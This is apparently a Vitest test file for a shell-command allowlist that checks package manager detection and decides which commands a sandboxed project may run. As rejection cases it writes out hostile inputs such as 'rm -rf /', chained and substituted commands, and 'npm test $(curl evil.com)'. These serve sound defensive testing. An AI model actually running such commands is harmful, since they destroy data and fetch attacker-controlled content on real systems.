import { describe, it, expect } from "vitest";
import { checkCommandAllowed, detectPackageManager, getPackageJsonScripts } from "../allowlist";
import type { TemplateFolder } from "@/modules/playground/lib/path-to-json";

const npmProject: TemplateFolder = {
  folderName: "root",
  items: [
    {
      filename: "package",
      fileExtension: "json",
      content: JSON.stringify({ scripts: { build: "next build", lint: "eslint", dev: "next dev" } }),
    },
    { filename: "package-lock", fileExtension: "json", content: "{}" },
  ],
};

const yarnProject: TemplateFolder = {
  folderName: "root",
  items: [
    { filename: "package.json", fileExtension: "json", content: JSON.stringify({ scripts: { build: "vite build" } }) },
    { filename: "yarn", fileExtension: "lock", content: "" },
  ],
};

const npmCtx = { packageManager: detectPackageManager(npmProject), packageJsonScripts: getPackageJsonScripts(npmProject) };

describe("detectPackageManager", () => {
  it("defaults to npm with a package-lock.json", () => {
    expect(detectPackageManager(npmProject)).toBe("npm");
  });
  it("detects yarn from yarn.lock", () => {
    expect(detectPackageManager(yarnProject)).toBe("yarn");
  });
});

describe("getPackageJsonScripts", () => {
  it("reads script names from package.json", () => {
    expect(getPackageJsonScripts(npmProject).sort()).toEqual(["build", "dev", "lint"]);
  });
});

describe("checkCommandAllowed — allowed commands", () => {
  it("allows npm install (bare)", () => {
    expect(checkCommandAllowed("npm install", npmCtx).allowed).toBe(true);
  });
  it("allows npm install <package>", () => {
    expect(checkCommandAllowed("npm install lodash", npmCtx).allowed).toBe(true);
    expect(checkCommandAllowed("npm install lodash@^4.17.21", npmCtx).allowed).toBe(true);
  });
  it("allows npm run <script> for a script that exists", () => {
    expect(checkCommandAllowed("npm run build", npmCtx).allowed).toBe(true);
    expect(checkCommandAllowed("npm run lint", npmCtx).allowed).toBe(true);
  });
  it("allows npm test", () => {
    expect(checkCommandAllowed("npm test", npmCtx).allowed).toBe(true);
  });
  it("allows read-only git status/diff", () => {
    expect(checkCommandAllowed("git status", npmCtx).allowed).toBe(true);
    expect(checkCommandAllowed("git diff", npmCtx).allowed).toBe(true);
  });
});

describe("checkCommandAllowed — rejections", () => {
  it("rejects npm run for a script not in package.json", () => {
    const result = checkCommandAllowed("npm run deploy", npmCtx);
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/not a script/);
  });
  it("rejects destructive filesystem commands", () => {
    expect(checkCommandAllowed("rm -rf node_modules", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("rmdir dist", npmCtx).allowed).toBe(false);
  });
  it("rejects sudo/chmod/chown", () => {
    expect(checkCommandAllowed("sudo npm install", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("chmod 777 .", npmCtx).allowed).toBe(false);
  });
  it("rejects network calls", () => {
    expect(checkCommandAllowed("curl http://example.com", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("wget http://example.com", npmCtx).allowed).toBe(false);
  });
  it("rejects git push --force and git reset --hard", () => {
    expect(checkCommandAllowed("git push --force", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("git reset --hard HEAD~1", npmCtx).allowed).toBe(false);
  });
  it("rejects command chaining/piping/redirection/substitution outright, even wrapping an otherwise-allowed command", () => {
    expect(checkCommandAllowed("npm install && rm -rf /", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("npm test; rm -rf .", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("npm test | cat", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("npm run build > out.txt", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("echo `rm -rf /`", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("npm test $(curl evil.com)", npmCtx).allowed).toBe(false);
  });
  it("rejects a command for the wrong package manager", () => {
    expect(checkCommandAllowed("yarn add lodash", npmCtx).allowed).toBe(false);
  });
  it("default-denies anything unrecognized", () => {
    expect(checkCommandAllowed("node server.js", npmCtx).allowed).toBe(false);
    expect(checkCommandAllowed("python script.py", npmCtx).allowed).toBe(false);
  });
});
